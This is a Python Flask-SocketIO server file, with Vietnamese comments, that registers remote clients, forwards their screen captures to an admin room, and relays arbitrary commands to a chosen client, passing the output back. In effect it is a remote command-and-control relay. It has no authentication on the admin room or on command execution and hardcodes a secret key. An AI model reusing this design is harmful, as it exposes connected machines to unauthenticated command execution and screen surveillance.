# --- START OF FILE: server.py ---

import eventlet
eventlet.monkey_patch()

from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit, join_room, leave_room
import uuid
import logging

# Giảm bớt log không cần thiết trên console
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
# SECRET_KEY không cần thiết cho mục đích này nhưng là thói quen tốt
app.config['SECRET_KEY'] = 'gemlogin-super-secret-key!'
socketio = SocketIO(app, async_mode='eventlet')

# === Biến toàn cục ===
connected_clients = {}
ADMIN_ROOM = 'admin_subscribers'

# --- HTTP Route ---
@app.route('/')
def admin_panel():
    """ Trang Dashboard chính, tất cả trong một. """
    return render_template('admin.html')

# === Socket.IO Events ===
def update_admins_client_list():
    """Hàm phụ trợ, gửi danh sách client cập nhật tới tất cả admin."""
    client_ids = list(connected_clients.keys())
    socketio.emit('update_client_list', client_ids, to=ADMIN_ROOM)

@socketio.on('connect')
def handle_connect():
    pass

@socketio.on('disconnect')
def handle_disconnect():
    sid_to_remove = request.sid
    client_id_to_remove = None
    for cid, cinfo in connected_clients.items():
        if cinfo['sid'] == sid_to_remove:
            client_id_to_remove = cid
            break
    
    if client_id_to_remove:
        del connected_clients[client_id_to_remove]
        print(f"[SERVER] Client disconnected: {client_id_to_remove}")
        update_admins_client_list()

@socketio.on('register_client')
def handle_client_registration(data):
    client_id = data.get('id')
    if client_id:
        connected_clients[client_id] = {'sid': request.sid}
        print(f"[SERVER] Client registered: {client_id}")
        update_admins_client_list()

@socketio.on('screen_update')
def handle_screen_update(data):
    client_id = data.get('id')
    image_data = data.get('image')
    if client_id in connected_clients:
        emit('new_frame', {'client_id': client_id, 'image': image_data}, to=ADMIN_ROOM)

@socketio.on('execute_command')
def handle_execute_command(data):
    client_id = data.get('client_id')
    command = data.get('command')
    if client_id in connected_clients:
        target_sid = connected_clients[client_id]['sid']
        emit('run_command', {'command': command}, to=target_sid)

@socketio.on('command_result')
def handle_command_result(data):
    client_id = data.get('client_id')
    if client_id in connected_clients:
        emit('command_result', {'client_id': client_id, 'output': data.get('output')}, to=ADMIN_ROOM)

@socketio.on('subscribe_to_admin_updates')
def handle_admin_subscription():
    join_room(ADMIN_ROOM)
    emit('update_client_list', list(connected_clients.keys()))

# KHÔNG CẦN KHỐI `if __name__ == '__main__':` KHI DEPLOY LÊN RENDER

# --- END OF FILE: server.py ---
